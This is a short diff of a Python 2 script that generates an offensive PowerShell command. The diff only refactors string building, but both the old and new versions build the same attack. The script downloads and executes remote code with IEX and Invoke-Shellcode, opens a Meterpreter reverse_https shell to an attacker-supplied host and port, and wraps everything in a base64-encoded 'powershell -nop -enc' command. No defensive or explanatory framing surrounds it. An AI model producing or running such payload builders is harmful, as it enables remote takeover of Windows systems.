@@ -9,14 +9,9 @@ import sys
 
 def build(url,lhost,lport):
     #build script syntax
-    script = "IEX (New-Object Net.WebClient).DownloadString('"
-    script += url
-    script += "'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "
-    script += lhost
-    script += " -Lport "
-    script += lport
-    script += " -Force"
-    
+    script = "IEX (New-Object Net.WebClient).DownloadString('{0}'); Invoke-Shellcode ".format(url)
+    script += "-Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".format(lhost,lport)
+
     print "The powershell syntax to be run:"
     print ""
     print script
@@ -29,9 +24,8 @@ def build(url,lhost,lport):
     encoded = base64.b64encode(unicode)
  
     #build the final command
-    cmd = "cmd.exe /c powershell.exe -nop -nol -enc "
-    cmd += encoded
- 
+    cmd = "cmd.exe /c powershell.exe -nop -nol -enc {0}".format(encoded)
+
     #check length in case long url is provided
     #http://support.microsoft.com/kb/830473
     cmdlen = len(cmd)
